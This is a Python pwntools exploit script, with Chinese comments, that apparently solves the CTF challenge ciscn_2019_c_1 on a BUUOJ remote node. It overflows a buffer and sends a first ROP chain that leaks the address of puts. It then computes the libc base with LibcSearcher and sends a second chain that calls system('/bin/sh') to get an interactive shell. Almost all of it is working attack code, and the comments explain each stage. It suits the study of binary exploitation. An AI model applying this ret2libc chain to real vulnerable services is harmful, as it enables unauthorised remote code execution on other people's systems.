from pwn import *
from LibcSearcher import *

pop_rdi = 0x400c83
main_addr = 0x400B28
ret_addr = 0x4006b9

'''
在大多数处理未开启 PIE 的 ELF 格式可执行文件的漏洞利用脚本中
使用 elf.plt['puts'] 和 elf.got['puts'] 来
获取 puts 函数的 PLT 地址和 GOT 地址是固定且通用的写法，但在特殊情况下可能需要进行调整。
'''
elf = ELF(r'../ciscn_2019_c_1')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_sym = elf.sym['main']

# print(hex(puts_plt))
# print(hex(puts_got))
# print(hex(main_sym))

puts_got_addr = 0x602020
puts_plt_addr = 0x4006E0

r = remote('node5.buuoj.cn', 25528)

'''
执行 pop rdi，将 puts_got 地址放入 rdi 寄存器。
执行 puts_plt，调用 puts 函数，puts 函数根据 rdi 寄存器中的地址，打印出 puts 函数的实际地址，实现地址泄露。
执行 main，程序返回到 main 函数，等待我们进行下一次输入和攻击
'''
puts_payload = b'A' * 0x50 + p64(0) + p64(pop_rdi) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(main_addr)

r.sendlineafter('Input your choice!\n', '1')
r.sendlineafter('Input your Plaintext to be encrypted\n', puts_payload)

r.recvline()
r.recvline()

puts_addr = u64(r.recvuntil('\n')[:-1].ljust(8, b'\0'))

print(hex(puts_addr))  # 0x7fc71841f9c0

'''
或者，获得puts地址之后，用网站分析：https://libc.blukat.me/?q=puts%3A9c0&l=libc6_2.27-0ubuntu3_amd64
算出system的地址、puts的地址（用于计算基地址）
下载文件，使用one-gadget分析获取execve的地址：one-gadget -f libc6_2.27-0ubuntu3_amd64.so
'''

# 获取对应版本的libc
libc = LibcSearcher('puts', puts_addr)  # libc6_2.27-0ubuntu3_amd64

# 计算基地址
libc_base_addr = puts_addr - libc.dump('puts')  # 0x7f9454b15000

print(hex(libc_base_addr))

# 推算出system和sh的地址
system_addr = libc_base_addr + libc.dump('system')  # 0x7f83c1c39440
bash_addr = libc_base_addr + libc.dump('str_bin_sh')  # 0x7f83c1d9de9a

print(hex(system_addr))
print(hex(bash_addr))

# 构建第二个payload，64位的ROP是bin/sh函数在前，system函数在后，32位的反之
# 使用ret指令地址解决栈对齐问题
fuck_payload = b'A' * 0x50 + p64(0) + p64(ret_addr) + p64(pop_rdi) + p64(bash_addr) + p64(system_addr)

r.sendlineafter('Input your choice!\n', '1')
r.sendlineafter('Input your Plaintext to be encrypted\n', fuck_payload)

r.interactive()
